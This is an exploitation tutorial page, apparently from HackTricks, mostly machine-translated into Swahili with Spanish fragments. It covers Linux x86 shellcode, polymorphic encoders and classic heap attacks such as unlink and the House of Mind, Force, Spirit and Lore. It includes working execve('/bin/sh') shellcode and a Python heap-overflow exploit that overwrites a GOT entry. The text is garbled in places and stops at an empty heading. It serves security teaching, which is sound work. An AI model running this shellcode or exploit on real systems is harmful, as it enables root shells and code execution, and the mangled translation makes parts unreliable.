# Linux Exploiting (Basic) (SPA)

{{#include ../../banners/hacktricks-training.md}}

## **2.SHELLCODE**

Tazama usumbufu wa kernel: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR_execve 11\
exit(0); // \_\_NR_exit 1

xor eax, eax ; tunasafisha eax\
xor ebx, ebx ; ebx = 0 kwa sababu hakuna hoja ya kupitisha\
mov al, 0x01 ; eax = 1 —> \_\_NR_exit 1\
int 0x80 ; Tekeleza syscall

**nasm -f elf assembly.asm** —> Inatuletea .o\
**ld assembly.o -o shellcodeout** —> Inatupa executable iliyoundwa na msimbo wa mkusanyiko na tunaweza kupata opcodes kwa **objdump**\
**objdump -d -Mintel ./shellcodeout** —> Ili kuona kwamba kwa kweli ni shellcode yetu na kupata OpCodes

**Kagua kwamba shellcode inafanya kazi**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Ili kuona kwamba wito za mfumo zinafanywa kwa usahihi, inapaswa kukusanywa programu iliyotangulia na wito za mfumo zinapaswa kuonekana katika **strace ./PROGRAMA_COMPILADO**

Wakati wa kuunda shellcodes, kuna ujanja unaoweza kufanywa. Amri ya kwanza ni jump kwa call. Call inaita msimbo wa asili na pia inaweka EIP kwenye stack. Baada ya amri ya call, tumeweka string ambayo tunahitaji, hivyo kwa EIP hiyo tunaweza kuelekeza kwenye string na pia kuendelea kutekeleza msimbo.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EJ kutumia Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Huter:**

Inajumuisha msimbo mdogo unaopita kwenye kurasa za kumbukumbu zinazohusishwa na mchakato kutafuta shellcode iliyohifadhiwa (inatafuta saini yoyote iliyowekwa kwenye shellcode). Inatumika katika hali ambapo kuna nafasi ndogo tu ya kuingiza msimbo.

**Shellcodes polimórficos**

Inajumuisha shells zilizofichwa ambazo zina msimbo mdogo unaozifichua na kuhamia kwake, ukitumia hila ya Call-Pop hii itakuwa **mfano wa kufichwa cesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.Métodos complementarios**

**Técnica de Murat**

Katika linux, programu zote zinapangwa kuanzia 0xbfffffff

Kwa kuangalia jinsi inavyoundwa stack ya mchakato mpya katika linux, inaweza kuendelezwa exploit kwa njia ambayo programu itazinduliwa katika mazingira ambayo variable pekee ni shellcode. Anwani hii basi inaweza kuhesabiwa kama: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

Kwa njia hii, anwani ambapo kuna variable ya mazingira na shellcode inaweza kupatikana kwa urahisi.

Hii inaweza kufanywa kwa sababu kazi execle inaruhusu kuunda mazingira ambayo yana tu variables za mazingira zinazotakiwa.

##

###

###

###

###

### **Format Strings to Buffer Overflows**

The **sprintf moves** a formatted string **to** a **variable.** Hivyo, unaweza kutumia **formatting** ya string kusababisha **buffer overflow in the variable** ambapo maudhui yanakopiwa.\
Kwa mfano, payload `%.44xAAAA` it **write 44B+"AAAA" in the variable**, ambayo inaweza kusababisha buffer overflow.

### **\_\_atexit Structures**

> [!CAUTION]
> Sasa ni **weird to exploit this**.

**`atexit()`** ni kazi ambayo **functions nyingine zinapewa kama parameters.** Hizi **functions** zita **executed** wakati wa kutekeleza **`exit()`** au **return** ya **main**.\
Ikiwa unaweza **modify** **address** ya yoyote ya hizi **functions** kuashiria shellcode kwa mfano, utapata **control** ya **process**, lakini hii kwa sasa ni ngumu zaidi.\
Kwa sasa, **addresses to the functions** zitakazotekelezwa zime **hidden** nyuma ya muundo kadhaa na hatimaye anwani ambayo inaashiria si anwani za functions, bali zime **encrypted with XOR** na displacement na **random key**. Hivyo kwa sasa, vector hii ya shambulio si **very useful at least on x86** na **x64_86**.\
Kazi ya **encryption** ni **`PTR_MANGLE`**. **Other architectures** kama m68k, mips32, mips64, aarch64, arm, hppa... **do not implement the encryption** function kwa sababu inarudisha **the same** kama ilivyopokea kama input. Hivyo, hizi architectures zingeweza kushambuliwa na vector hii.

### **setjmp() & longjmp()**

> [!CAUTION]
> Sasa ni **weird to exploit this**.

**`Setjmp()`** inaruhusu **save** **context** (registers)\
**`longjmp()`** inaruhusu **restore** **context**.\
**Saved registers** ni: `EBX, ESI, EDI, ESP, EIP, EBP`\
Kina kinachotokea ni kwamba EIP na ESP vinapita na **`PTR_MANGLE`** function, hivyo **architecture vulnerable to this attack are the same as above**.\
Zinatumika kwa ajili ya urejeleaji wa makosa au kukatizwa.\
Hata hivyo, kutokana na kile nilichosoma, register nyingine hazijalindwa, **hivyo ikiwa kuna `call ebx`, `call esi` au `call edi`** ndani ya kazi inayoitwa, control inaweza kuchukuliwa. Au unaweza pia kubadilisha EBP ili kubadilisha ESP.

**VTable na VPTR katika C++**

Kila darasa lina **Vtable** ambayo ni array ya **pointers to methods**.

Kila kitu cha **class** kina **VPtr** ambayo ni **pointer** kwa array ya darasa lake. VPtr ni sehemu ya kichwa cha kila kitu, hivyo ikiwa **overwrite** ya **VPtr** inafanikiwa inaweza **modified** ili **point** kwa njia ya dummy ili kutekeleza kazi kutakuwa na shellcode.

## **Medidas preventivas y evasiones**

###

**Reemplazo de Libsafe**

Inawashwa na: LD_PRELOAD=/lib/libsafe.so.2\
au\
“/lib/libsave.so.2” > /etc/ld.so.preload

Inakabiliwa na simu za baadhi ya kazi zisizo salama kwa nyingine salama. Haijapangwa. (ni kwa x86 tu, si kwa toleo lililojengwa na -fomit-frame-pointer, si toleo la static, si kazi zote dhaifu zinakuwa salama na LD_PRELOAD haitumiki katika binaries zenye suid).

**ASCII Armored Address Space**

Inajumuisha kupakia maktaba za pamoja kutoka 0x00000000 hadi 0x00ffffff ili kila wakati kuwe na byte 0x00. Hata hivyo, hii kwa kweli haisimamishi mashambulizi yoyote, na hasa katika little endian.

**ret2plt**

Inajumuisha kufanya ROP kwa njia ambayo inaita kazi strcpy@plt (kutoka plt) na kuashiria kwenye ingizo la GOT na kunakili byte ya kwanza ya kazi ambayo inataka kuitwa (system()). Kisha inafanywa vivyo hivyo ikielekeza kwenye GOT+1 na kunakili byte ya 2 ya system()… Mwishowe inaita anwani iliyohifadhiwa katika GOT ambayo itakuwa system()

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user —> Inasakinisha mfumo wa msingi chini ya subdirectorio maalum

Msimamizi anaweza kutoka kwenye moja ya jaula hizi kwa kufanya: mkdir foo; chroot foo; cd ..

**Instrumentación de código**

Valgrind —> Inatafuta makosa\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits básicos**

**Trozo asignado**

prev_size |\
size | —Cabecera\
\*mem | Datos

**Trozo libre**

prev_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk —Cabecera\
\*mem | Datos

Vipande vya bure viko kwenye orodha ya kuunganishwa mara mbili (bin) na haviwezi kuwa na vipande viwili vya bure pamoja (vinajumuika)

Katika “size” kuna bits za kuashiria: Ikiwa kipande cha awali kinatumika, ikiwa kipande kimepewa kupitia mmap() na ikiwa kipande kinahusiana na arena ya msingi.

Ikiwa unapofungua kipande chochote cha jirani kinapatikana bure, vinajumuika kupitia macro unlink() na kipande kipya kikubwa zaidi kinapelekwa frontlink() ili kiingize bin inayofaa.

unlink(){\
BK = P->bk; —> BK ya kipande kipya ni ile ambayo ilikuwa na ile iliyokuwa bure kabla\
FD = P->fd; —> FD ya kipande kipya ni ile ambayo ilikuwa na ile iliyokuwa bure kabla\
FD->bk = BK; —> BK ya kipande kinachofuata inaelekeza kwa kipande kipya\
BK->fd = FD; —> FD ya kipande cha awali inaelekeza kwa kipande kipya\
}

Hivyo basi, ikiwa tunafanikiwa kubadilisha P->bk na anwani ya shellcode na P->fd na anwani ya ingizo katika GOT au DTORS - 12, inafanikiwa:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor_end\_\_ - 12) + 12) = \&shellcode

Na hivyo shellcode inatekelezwa wakati wa kutoka kwenye programu.

Zaidi, sentensi ya 4 ya unlink() inaandika kitu na shellcode inapaswa kuwa na marekebisho kwa hili:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor_end\_\_ - 12) —> Hii inasababisha kuandika bytes 4 kuanzia byte ya 8 ya shellcode, hivyo amri ya kwanza ya shellcode inapaswa kuwa jmp ili kuondoka hapa na kuanguka kwenye nops ambazo zinaelekea kwenye sehemu nyingine ya shellcode.

Hivyo basi exploit inaundwa:

Katika buffer1 tunatia shellcode ikianza na jmp ili kuanguka kwenye nops au kwenye sehemu nyingine ya shellcode.

Baada ya shell code tunatia kujaza hadi kufikia uwanja prev_size na size wa kipande kinachofuata. Katika maeneo haya tunatia 0xfffffff0 (ili kuandika prev_size ili iwe na bit inayosema kuwa iko bure) na “-4“(0xfffffffc) katika size (ili wakati inakagua katika kipande cha 3 ikiwa kipande cha 2 kilikuwa bure kwa kweli kiende kwenye prev_size iliyobadilishwa ambayo itamwambia kuwa kiko bure) -> Hivyo wakati free() inachunguza itakwenda kwenye size ya 3 lakini kwa kweli itakwenda kwenye 2 - 4 na kufikiri kuwa kipande cha 2 kiko bure. Na kisha itaita **unlink()**.

Wakati wa kuita unlink() itatumia kama P->fd data za kwanza za kipande cha 2 hivyo hapo kutakuwa na anwani unayotaka kuandika - 12 (kwa sababu katika FD->bk itazidisha 12 kwa anwani iliyohifadhiwa katika FD). Na katika anwani hiyo itatia anwani ya pili ambayo itakutana katika kipande cha 2, ambayo tunataka iwe anwani ya shellcode (P->bk bandia).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev_size) pues es ahí donde mira si el 2º trozo está libre**

**addr_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev_size + fake_size + got_free + addr_sc #Se modifica el 2º trozo, el got_free apunta a donde vamos a guardar la direccion addr_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Tunadhibiti vipande 3 vya mfululizo na vinachukuliwa kwa mpangilio wa kinyume na ulivyohifadhiwa.

Katika kesi hiyo:

Katika chunck c tunatia shellcode

Chunck a tunatumia kuandika b kwa njia ambayo size iwe na bit PREV_INUSE iliyozimwa ili kufikiri kuwa chunck a iko bure.

Zaidi, tunandika katika kichwa b size ili iwe -4.

Hivyo, programu itafikiri kuwa “a” iko bure na katika bin, hivyo itaita unlink() ili kuondoa. Hata hivyo, kama kichwa cha PREV_SIZE kina thamani -4. Itafikiri kuwa kipande cha “a” kwa kweli kinaanza katika b+4. Yaani, itafanya unlink() kwa kipande kinachoanza katika b+4, hivyo katika b+12 kutakuwa na pointer “fd” na katika b+16 kutakuwa na pointer “bk”.

Kwa njia hii, ikiwa katika bk tunatia anwani ya shellcode na katika fd tunatia anwani ya kazi “puts()”-12 tuna payload yetu.

**Técnica de Frontlink**

Inaitwa frontlink wakati kitu kinacholewa na hakuna kipande chake cha jirani ambacho hakiko bure, hakuitwi unlink() bali inaitwa moja kwa moja frontlink().

Udhaifu huu ni muhimu wakati malloc inayoshambuliwa kamwe haiachiliwi (free()).

Inahitaji:

Buffer ambayo inaweza kujaa na kazi ya kuingiza data

Buffer inayofuatana na hii ambayo inapaswa kuachiliwa na ambayo itabadilishwa uwanja wa fd wa kichwa chake kwa sababu ya overflow ya buffer ya awali

Buffer ya kuachiliwa yenye ukubwa mkubwa kuliko 512 lakini mdogo kuliko buffer ya awali

Buffer iliyotangulia kabla ya hatua ya 3 ambayo inaruhusu kuandika prev_size hii

Kwa njia hii, kwa kuandika katika mallocs mbili kwa njia isiyo ya kudhibitiwa na katika moja kwa njia ya kudhibitiwa lakini ambayo inachiliwa tu hiyo moja, tunaweza kufanya exploit.

**Vulnerabilidad double free()**

Ikiwa inaitwa mara mbili free() na pointer ile ile, kuna bins mbili zinazoelekeza kwenye anwani ile ile.

Katika kesi ya kutaka kutumia moja, itapewa bila matatizo. Katika kesi ya kutaka kutumia nyingine, itapewa nafasi ile ile hivyo tutakuwa na pointers “fd” na “bk” zilizopotoshwa na data ambazo zitaandikwa na uhifadhi wa awali.

**After free()**

Pointer iliyokuwa imeachiliwa awali inatumika tena bila kudhibitiwa.

## **8 Heap Overflows: Exploits avanzados**

Mbinu za Unlink() na FrontLink() ziliondolewa kwa kubadilisha kazi unlink().

**The house of mind**

Simu moja tu ya free() inahitajika ili kusababisha utekelezaji wa msimbo wa kawaida. Inahitajika kutafuta kipande cha pili ambacho kinaweza kujaa na kipande cha awali na kuachiliwa.

Simu moja ya free() inasababisha kuita public_fREe(mem), hii inafanya:

mstate ar_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Inarudisha pointer kwa anwani ambapo kipande kinaanza (mem-8)

…

ar_ptr = arena_for_chunk(p); —> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

…

\_int_free(ar_ptr, mem);

}

Katika \[1] inakagua uwanja wa size bit NON_MAIN_ARENA, ambayo inaweza kubadilishwa ili ukaguzi urudishe kweli na kutekeleze heap_for_ptr() ambayo inafanya and kwa “mem” ikiacha 0 bytes 2.5 zisizo muhimu (katika kesi yetu kutoka 0x0804a000 inacha 0x08000000) na inafikia 0x08000000->ar_ptr (kama vile ni struct heap_info)

Kwa njia hii ikiwa tunaweza kudhibiti kipande kwa mfano katika 0x0804a000 na kuna kipande kitakachochukuliwa katika **0x081002a0** tunaweza kufikia anwani 0x08100000 na kuandika chochote tunachotaka, kwa mfano **0x0804a000**. Wakati kipande hiki cha pili kitachukuliwa, kitakuta kuwa heap_for_ptr(ptr)->ar_ptr inarudisha kile tulichoandika katika 0x08100000 (kwa sababu inatumika kwa 0x081002a0 and ambayo tuliona hapo awali na kutoka hapo inachukuliwa thamani ya bytes 4 za kwanza, ar_ptr)

Kwa njia hii inaitwa \_int_free(ar_ptr, mem), yaani, **\_int_free(0x0804a000, 0x081002a0)**\
**\_int_free(mstate av, Void_t\* mem){**\
…\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kama tulivyona hapo awali tunaweza kudhibiti thamani ya av, kwani ni kile tunachoandika katika kipande kitakachochukuliwa.

Kama inavyofafanuliwa unsorted_chunks, tunajua kwamba:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Hivyo basi ikiwa katika av->bins\[2] tunaandika thamani ya \_\_DTOR_END\_\_-12 katika amri ya mwisho itaandika katika \_\_DTOR_END\_\_ anwani ya kipande cha pili.

Yaani, katika kipande cha kwanza tunahitaji kuweka mara nyingi anwani ya \_\_DTOR_END\_\_-12 kwa sababu hapo ndipo av->bins\[2] itachukuliwa.

Katika anwani ambayo itakuwa anwani ya kipande cha pili na sifuri tano za mwisho tunahitaji kuandika anwani ya kipande hiki cha kwanza ili heap_for_ptr() ifikirie kuwa ar_ptr iko mwanzo wa kipande cha kwanza na kuchukua kutoka hapo av->bins\[2]

Katika kipande cha pili na kwa msaada wa kipande cha kwanza tunabadilisha prev_size na jump 0x0c na size na kitu ili kuamsha -> NON_MAIN_ARENA

Kisha katika kipande 2 tunatia nops nyingi na hatimaye shellcode

Kwa njia hii itaita \_int_free(TROZO1, TROZO2) na kufuata maelekezo ya kuandika katika \_\_DTOR_END\_\_ anwani ya prev_size ya TROZO2 ambayo itaruka kwenye shellcode.

Ili kutumia mbinu hii inahitajika kutimizwa baadhi ya mahitaji zaidi ambayo yanakabili kidogo payload.

Mbinu hii sasa haiwezi kutumika kwa sababu ilitumiwa karibu na patch ile ile kama kwa unlink. Inalinganishwa ikiwa eneo jipya ambalo linapojulikana pia linapojulikana kwake.

**Fastbin**

Ni toleo la The house of mind

Tunataka kufikia kutekeleza msimbo ufuatao ambao unafikiwa baada ya ukaguzi wa kwanza wa kazi \_int_free()

fb = &(av->fastbins\[fastbin_index(size)] —> Ikiwa fastbin_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Kwa njia hii ikiwa tunatia katika “fb” inatoa anwani ya kazi katika GOT, katika anwani hii itatia anwani ya kipande kilichosababisha. Ili kufanya hivyo itahitajika kwamba arena iwe karibu na anwani za dtors. Kwa usahihi av->max_fast iwe katika anwani ambayo tutakuwa tukisababisha.

Kwa sababu na The House of Mind tuliona kwamba sisi tunadhibiti nafasi ya av.

Hivyo ikiwa katika uwanja size tunatia ukubwa wa 8 + NON_MAIN_ARENA + PREV_INUSE —> fastbin_index() itatreturn fastbins\[-1], ambayo itakuwa inashikilia av->max_fast

Katika kesi hii av->max_fast itakuwa anwani ambayo itasababisha (siyo ile ambayo inashikilia, bali hiyo nafasi itakuwa inasababisha).

Zaidi, inapaswa kutimizwa kwamba kipande kinachofuata kilichochukuliwa kinapaswa kuwa kikubwa zaidi ya 8 -> Kwa sababu tumesema kwamba size ya kipande kilichochukuliwa ni 8, katika kipande hiki bandia tunahitaji tu kuweka size kubwa zaidi ya 8 (kama vile shellcode itakuwa katika kipande kilichochukuliwa, itabidi kuweka mwanzo jmp ambayo itanguka kwenye nops).

Zaidi, kipande hiki bandia kinapaswa kuwa kidogo kuliko av->system_mem. av->system_mem iko 1848 bytes zaidi.

Kwa sababu ya sifuri za \_DTOR_END\_ na anwani chache katika GOT, hakuna anwani katika sehemu hizi zinazofaa kuandikwa, hivyo tuone jinsi ya kutumia fastbin kushambulia stack.

Njia nyingine ya shambulio ni kuelekeza **av** kwenye stack.

Ikiwa tunabadilisha size ili iwe 16 badala ya 8 basi: fastbin_index() itatreturn fastbins\[0] na tunaweza kutumia hii kuandika kwenye stack.

Ili kufanya hivyo, hakupaswi kuwa na canary au thamani za ajabu kwenye stack, kwa kweli tunapaswa kuwa katika hii: 4bytes sifuri + EBP + RET

Sifuri 4 zinahitajika ili **av** iwe katika anwani hii na kipengele cha kwanza cha **av** ni mutexe ambayo inapaswa kuwa 0.

**av->max_fast** itakuwa EBP na itakuwa thamani ambayo itatusaidia kupita vizuizi.

Katika **av->fastbins\[0]** itasababisha anwani ya **p** na itakuwa RET, hivyo itaruka kwenye shellcode.

Zaidi, katika **av->system_mem** (1484bytes juu ya nafasi kwenye stack) kutakuwa na takataka nyingi ambazo zitaturuhusu kupita ukaguzi unaofanywa.

Zaidi, inapaswa kutimizwa kwamba kipande kinachofuata kilichochukuliwa kinapaswa kuwa kikubwa zaidi ya 8 -> Kwa sababu tumesema kwamba size ya kipande kilichochukuliwa ni 16, katika kipande hiki bandia tunahitaji tu kuweka size kubwa zaidi ya 8 (kama vile shellcode itakuwa katika kipande kilichochukuliwa, itabidi kuweka mwanzo jmp ambayo itanguka kwenye nops ambazo ziko baada ya uwanja size wa kipande bandia jipya).

**The House of Spirit**

Katika kesi hii tunatafuta kuwa na pointer kwa malloc ambayo inaweza kubadilishwa na mshambuliaji (kwa mfano, kwamba pointer iko kwenye stack chini ya overflow inayoweza kutokea kwa variable).

Hivyo, tunaweza kufanya pointer hii kuelekeza popote. Hata hivyo, si kila mahali ni halali, ukubwa wa kipande bandia lazima uwe mdogo kuliko av->max_fast na kwa usahihi sawa na ukubwa ulioombwa katika simu ya baadaye kwa malloc()+8. Kwa hivyo, ikiwa tunajua kwamba baada ya pointer hii dhaifu inaitwa malloc(40), ukubwa wa kipande bandia lazima uwe sawa na 48.

Ikiwa kwa mfano programu inamuuliza mtumiaji nambari tunaweza kuingiza 48 na kuelekeza pointer ya malloc inayoweza kubadilishwa kwa bytes nne zinazofuata (ambazo zinaweza kuwa za EBP kwa bahati, hivyo 48 inabaki nyuma, kana kwamba ni kichwa cha size). Zaidi, anwani ptr-4+48 inapaswa kutimiza masharti kadhaa (ikiwa katika kesi hii ptr=EBP), yaani, 8 < ptr-4+48 < av->system_mem.

Ikiwa hii inatimizwa, wakati simu inayofuata ya malloc ambayo tulisema ilikuwa malloc(40) itapewa kama anwani anwani ya EBP. Ikiwa mshambuliaji pia anaweza kudhibiti kile kinachoandikwa katika malloc hii anaweza kuandika EBP na EIP kwa anwani anayotaka.

Hii nadhani ni kwa sababu wakati itakapofutwa free() itahifadhi kwamba katika anwani ambayo inaelekeza kwa EBP ya stack kuna kipande cha ukubwa mzuri kwa malloc mpya ambayo inataka kuhifadhiwa, hivyo inatoa anwani hiyo.

**The House of Force**

Inahitajika:

- Overflow kwa kipande kinachoruhusu kuandika wilderness
- Simu ya malloc() yenye ukubwa ulioamuliwa na mtumiaji
- Simu ya malloc() ambayo data zake zinaweza kufafanuliwa na mtumiaji

Kitu cha kwanza kinachofanywa ni kuandika size ya kipande wilderness kwa thamani kubwa sana (0xffffffff), hivyo ombi lolote la kumbukumbu kubwa litashughulikiwa katika \_int_malloc() bila haja ya kupanua heap

Kitu cha pili ni kubadilisha av->top ili iangalie eneo la kumbukumbu chini ya udhibiti wa mshambuliaji, kama vile stack. Katika av->top itatia \&EIP - 8.

Tunapaswa kuandika av->top ili iangalie eneo la kumbukumbu chini ya udhibiti wa mshambuliaji:

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

Victim inachukua thamani ya anwani ya kipande cha sasa cha wilderness (av->top ya sasa) na remainder ni jumla ya anwani hiyo na kiasi cha bytes kilichohitajika na malloc(). Hivyo ikiwa \&EIP-8 iko katika 0xbffff224 na av->top ina 0x080c2788, basi kiasi tunachohitaji kuhifadhi katika malloc inayoweza kudhibitiwa ili av->top iwe inatazama $EIP-8 kwa malloc inayofuata itakuwa:

0xbffff224 - 0x080c2788 = 3086207644.

Hivyo itahifadhiwa katika av->top thamani iliyobadilishwa na malloc inayofuata itatazama EIP na inaweza kuandika.

Ni muhimu kujua kwamba size ya kipande kipya cha wilderness ni kubwa zaidi kuliko ombi lililofanywa na malloc ya mwisho. Yaani, ikiwa wilderness inatazama \&EIP-8, size itakuwa tu katika uwanja EBP wa stack.

**The House of Lore**

**Corrupción SmallBin**

Vipande vilivyofutwa vinapelekwa kwenye bin kulingana na ukubwa wao. Lakini kabla ya kupelekwa huwekwa katika unsorted bins. Kipande kinapofutwa hakijapelekwa mara moja kwenye bin yake bali kinabaki katika unsorted bins. Kisha, ikiwa kipande kipya kinahitajika na kipande cha awali kilichofutwa kinaweza kutumika, kinarejeshwa, lakini ikiwa kinahitajika kikubwa zaidi, kipande kilichofutwa katika unsorted bins kinapelekwa kwenye bin yake inayofaa.

Ili kufikia msimbo dhaifu ombi la kumbukumbu linapaswa kuwa kubwa zaidi ya av->max_fast (72 kwa kawaida) na chini ya MIN_LARGE_SIZE (512).

Ikiwa katika bin kuna kipande cha ukubwa unaofaa kwa kile kinachohitajika kinarejeshwa baada ya kuondolewa:

bck = victim->bk; Inaelekeza kwenye kipande cha awali, ni taarifa pekee ambayo tunaweza kubadilisha.

bin->bk = bck; Kipande cha pili cha mwisho kinakuwa cha mwisho, ikiwa bck inaelekeza kwenye stack kipande kinachofuata kinachohifadhiwa kitapewa anwani hii

bck->fd = bin; Inafunga orodha ikifanya hii kuelekeza kwa bin

Inahitaji:

Kuhifadhi malloc mbili, kwa njia ambayo ya kwanza inaweza kujaa baada ya ya pili kuachiliwa na kuingizwa kwenye bin yake (yaani, kuhifadhi malloc kubwa zaidi kuliko kipande cha pili kabla ya kufanya overflow)

Kuhifadhi malloc iliyohifadhiwa ambayo inapata anwani iliyochaguliwa na mshambuliaji inapaswa kudhibitiwa na mshambuliaji.

Lengo ni lifuatalo, ikiwa tunaweza kufanya overflow kwenye heap ambayo chini yake kuna kipande kilichofutwa tayari na katika bin yake, tunaweza kubadilisha pointer yake bk. Ikiwa tunabadilisha pointer yake bk na kipande hiki kinakuwa cha kwanza katika orodha ya bin na kinahifadhiwa, bin itadanganywa na kuambiwa kwamba kipande cha mwisho katika orodha (kilichofuata kutoa) kiko katika anwani bandia ambayo tumepanga (kwa stack au GOT kwa mfano). Hivyo ikiwa kutakuwa na kuhifadhiwa kipande kingine na mshambuliaji ana ruhusa kwake, atapewa kipande katika nafasi inayotakiwa na anaweza kuandika humo.

Baada ya kuondoa kipande kilichobadilishwa inahitajika kuhifadhi kipande kikubwa zaidi kuliko kilichofutwa, hivyo kipande kilichobadilishwa kitatoka kwenye unsorted bins na kuingizwa kwenye bin yake.

Mara kipande kikiwa kwenye bin yake ni wakati wa kubadilisha pointer yake bk kupitia overflow ili iangalie anwani tunayotaka kuandika.

Hivyo bin itasubiri zamu hadi itakapoitwa malloc() mara nyingi za kutosha ili itumike tena bin iliyobadilishwa na kudanganya bin ikifanya ionekane kwamba kipande kinachofuata kiko katika anwani bandia. Kisha itatoa kipande ambacho tunataka.

Ili kutekeleza udhaifu haraka iwezekanavyo, bora ingekuwa: Kuhifadhi kipande dhaifu, kuhifadhi kipande kitakachobadilishwa, kuondoa kipande hiki, kuhifadhi kipande kikubwa zaidi ambacho kitabadilishwa, kubadilisha kipande (udhaifu), kuhifadhi kipande sawa na kipande kilichodhuriwa na kuhifadhi kipande cha pili sawa na kipande hiki ambacho kitakuwa kinatazama anwani iliyochaguliwa.

Ili kulinda shambulio hili, ilitumika ukaguzi wa kawaida kwamba kipande “siyo” bandia: inakagua ikiwa bck->fd inaelekeza kwa victim. Yaani, katika kesi yetu ikiwa pointer fd* ya kipande bandia inayoshikiliwa kwenye stack inaelekeza kwa victim. Ili kupita ulinzi huu mshambuliaji anahitaji kuwa na uwezo wa kuandika kwa namna fulani (kwa stack labda) katika anwani sahihi anwani ya victim. Ili hivyo ionekane kama kipande halisi.

**Corrupción LargeBin**

Inahitaji mahitaji sawa na yale ya awali na mengine zaidi, zaidi ya hayo, vipande vilivyohifadhiwa vinapaswa kuwa vikubwa zaidi ya 512.

Shambulio ni kama la awali, yaani, inahitaji kubadilisha pointer bk na inahitaji simu zote hizo za malloc(), lakini zaidi inahitaji kubadilisha size ya kipande kilichobadilishwa ili size hiyo - nb iwe < MINSIZE.

Kwa mfano itafanya kuweka katika size 1552 ili 1552 - 1544 = 8 < MINSIZE (tofauti haiwezi kuwa hasi kwa sababu inalinganishwa na unsigned)

Zaidi ya hayo, patch imewekwa ili kufanya iwe ngumu zaidi.

**Heap Spraying**

